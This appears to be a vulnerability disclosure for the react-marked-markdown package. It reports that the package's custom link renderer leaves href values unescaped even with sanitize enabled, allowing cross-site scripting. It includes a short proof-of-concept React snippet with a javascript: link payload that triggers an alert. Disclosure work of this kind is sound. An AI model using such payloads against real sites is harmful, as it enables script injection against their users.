# Vulnerability

## Vulnerability Description

The React component created with react-marked-markdown contains XSS in link values even when the sanitize option is set to true.

The react-marked-markdown module uses marked.Render() but overwrites the link method with a custom version that doesn't correctly escape values passed to the href prop of anchor components.

## Steps To Reproduce:

import React from 'react'
import ReactDOM from 'react-dom'
import { MarkdownPreview } from 'react-marked-markdown'

ReactDOM.render(
  <MarkdownPreview
    markedOptions={{ sanitize: true }}
    value={'[XSS](javascript: alert`1`)'}
  />,
  document.getElementById('root')
)

## Impact

The software does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page that is served to other users. This allows attackes to add malicious scripts to the page via Markdown.
